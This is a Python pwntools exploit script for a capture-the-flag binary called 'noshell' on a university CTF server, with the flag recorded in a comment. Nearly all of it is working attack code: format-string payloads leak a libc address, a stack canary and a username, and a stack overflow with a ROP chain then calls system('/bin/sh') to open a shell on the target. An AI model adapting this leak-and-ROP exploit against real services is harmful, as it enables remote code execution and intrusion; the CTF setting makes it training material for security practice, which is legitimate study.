#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host cybersecweek.ua.pt --port 2015 ./noshell
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./noshell')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'cybersecweek.ua.pt'
port = int(args.PORT or 2015)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x5555555554a6
b *0x5555555553a1
b *0x5555555552fd
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
libc = exe.libc
libc = ELF("./libc6_2.28-10_amd64.so")

io.sendlineafter("User: ","%6$s-%20$p")

io.recvuntil("Incorrect user: ")
data = io.recvline()[:-1].split("-")
libc.address = int(data[1],16) - libc.sym['__libc_start_main'] - 205 -0x1e
print(hex(libc.address))

io.sendlineafter(": ","y")

io.sendlineafter("User: ","%12$p-%5$s")

io.recvuntil("Incorrect user: ")
data2 = io.recvline()[:-1].split("-")
print(data2)
canary = int(data2[0],16)


io.sendlineafter(": ","y")

io.sendlineafter("User: ",data[0])


p = "toor"+'a'*4
p += 'a'*(32)
p += p64(canary)
p += p64(0)


rop = ROP([libc])
rop.system(next(libc.search("/bin/sh\x00")))

p += rop.chain()
# p += ''
io.sendlineafter("Password: ",p)

# CTFUA{4_l34k_4_d4y_t0_tr41n_4nd_pl4y}
io.interactive()

